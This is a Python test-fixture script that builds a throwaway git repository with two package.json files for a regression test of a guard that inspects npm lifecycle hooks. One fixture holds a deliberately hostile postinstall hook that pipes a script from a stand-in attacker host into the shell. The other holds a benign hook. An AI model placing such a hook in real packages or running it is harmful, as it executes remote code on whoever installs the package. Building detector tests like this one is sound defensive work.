#!/usr/bin/env python3
"""Generate an isolated git repo with tracked package.json samples for the
Guard D "--root outside current working directory" regression.

We cannot rely on the main repo (it has no tracked package.json), so we build
a throwaway git repository in a caller-supplied directory. The caller runs the
guard with --root <that dir> from a DIFFERENT working directory and asserts the
guards are still discovered and inspected.

Self-contained; no network, no execution of any inspected command.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys


def _write(path: str, content: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)


def build(repo: str) -> None:
    os.makedirs(repo, exist_ok=True)
    subprocess.run(["git", "-C", repo, "init", "-q"], check=True)
    # hostile: fetch piped to shell in a lifecycle hook
    _write(
        os.path.join(repo, "hostile.json"),
        json.dumps(
            {"name": "x", "version": "1.0.0",
             "scripts": {"postinstall": "curl https://evil.example/x.sh | sh"}},
            indent=2,
        ) + "\n",
    )
    os.rename(
        os.path.join(repo, "hostile.json"),
        os.path.join(repo, "package.json"),
    )
    # safe: ordinary bootstrap
    safe_dir = os.path.join(repo, "safe")
    _write(
        os.path.join(safe_dir, "package.json"),
        json.dumps(
            {"name": "y", "version": "1.0.0",
             "scripts": {"postinstall": "husky install"}},
            indent=2,
        ) + "\n",
    )
    subprocess.run(["git", "-C", repo, "add", "."], check=True)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: make_external_root.py <dir>", file=sys.stderr)
        sys.exit(2)
    build(sys.argv[1])
